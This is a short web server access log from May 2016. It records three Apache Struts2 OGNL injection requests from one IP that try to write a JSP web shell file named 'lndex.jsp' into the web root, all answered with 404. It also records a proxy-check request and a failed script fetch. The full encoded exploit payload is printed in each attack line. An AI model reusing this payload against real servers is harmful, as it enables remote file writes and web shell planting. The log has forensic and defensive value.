222.186.34.83 - - [28/May/2016:20:39:58 +0800] "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 2772 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
222.186.34.83 - - [28/May/2016:20:39:59 +0800] "GET /admin/loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 4576 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
222.186.34.83 - - [28/May/2016:20:40:06 +0800] "GET /index.do?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 2760 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1"
101.201.147.32 - - [28/May/2016:21:11:33 +0800] "GET /js/roadShowForAunigold.min.js HTTP/1.1" 400 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
107.151.226.242 - - [28/May/2016:21:17:57 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
